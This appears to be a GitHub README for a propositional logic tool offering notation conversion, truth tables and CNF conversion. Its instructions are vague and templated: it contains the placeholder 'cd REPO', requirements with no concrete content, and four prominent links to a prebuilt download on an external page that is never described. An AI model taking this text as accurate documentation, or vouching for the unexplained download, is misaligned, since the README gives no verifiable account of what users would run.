# Propositional Logic Engine v1.0 - logic engine 2026

> **A cross-platform engine for propositional logic, boolean expressions, and truth-table analysis, prepared for the v1.0 release.**

[![Platform](https://img.shields.io/badge/Platform-cross-platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leox2002/propositional-logic-engine-v1?style=flat-square)](https://github.com/leox2002/propositional-logic-engine-v1)

---

<p align="center">
  <a href="https://leox2002.github.io/propositional-logic-engine-v1/">
    <img src="https://img.shields.io/badge/Download-Propositional%20Logic%20Engine%20Latest-brightgreen?style=for-the-badge" alt="Download Propositional Logic Engine">
  </a>
</p>

> **[Direct Download - Propositional Logic Engine v1.0](https://leox2002.github.io/propositional-logic-engine-v1/)**

---

[Download Latest Build](https://leox2002.github.io/propositional-logic-engine-v1/)

---

## Overview

Propositional Logic Engine is a cross-platform utility for handling boolean formulas in multiple standard representations. It lets you translate between infix and prefix notation, construct and inspect expression trees, and evaluate formulas or produce truth tables for analysis.

The project is aimed at students, developers, and anyone exploring formal logic who wants a practical way to test expressions and convert them into canonical forms. It also includes CNF conversion and CNF clause validation, which makes it useful for logic assignments, experimentation, and automated verification.

---

## What it can do

- Parse prefix expressions into binary trees
- Convert infix formulas into prefix notation
- Print formulas back in infix form
- Compute the height of an expression tree
- Evaluate formulas using truth assignments
- Generate truth tables for boolean formulas
- Convert formulas to CNF
- Validate CNF clauses for structural correctness

---

## Getting started

Clone the repository, then open the project in the environment you prefer:

```bash
git clone https://github.com/leox2002/propositional-logic-engine-v1.git
cd REPO
```

If you are working with the released build, download it using the project link above and start it according to your platform. For local development or testing, run the project"s main entry point after the files have been placed in the correct location.

---

## Using the engine

A common workflow looks like this:

1. Provide a propositional formula in either infix or prefix notation.
2. Convert the expression whenever a different form is needed.
3. Build or inspect the expression tree.
4. Evaluate the formula against a chosen truth assignment.
5. Produce a full truth table for broader comparison.
6. Convert the expression to CNF and validate the resulting clauses.

Typical usage patterns:

- Choose infix input when you want something easy to read and write.
- Switch to prefix form when tree-oriented processing is more convenient.
- Use truth tables to compare results across every variable combination.
- Apply CNF conversion when a normalized logical representation is required.

---

## Configuration

Exact configuration depends on how you run the engine. If your copy includes local settings, keep them alongside the application entry point or in the repository's main runtime files.

A minimal setup may look like this:

```text
input_mode = infix
output_mode = prefix
enable_truth_table = true
enable_cnf_conversion = true
```

Tune the available options to match the implementation you are using.

---

## System requirements

- Cross-platform runtime environment
- A system capable of running the project files
- Sufficient memory and storage for local execution and formula processing
- Access to the repository source or downloadable build

---

## FAQ

**How do I stay current?**  
Visit the repository from time to time and download the newest published build whenever a new release appears.

**Where does the app keep its settings?**  
That varies with the runtime layout of your copy of the project. Check the application files or the local configuration area used by the engine.

**What should I check if a formula evaluates incorrectly?**  
Look over the input syntax, verify the variable assignments, and make sure the formula uses the proper notation.

**Is CNF validation included?**  
Yes. The engine provides CNF conversion along with clause validation so you can confirm the structure of the output.

**Who will find this useful?**  
It is a good fit for logic students, instructors, researchers, and developers who need a lightweight way to inspect and transform propositional formulas.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
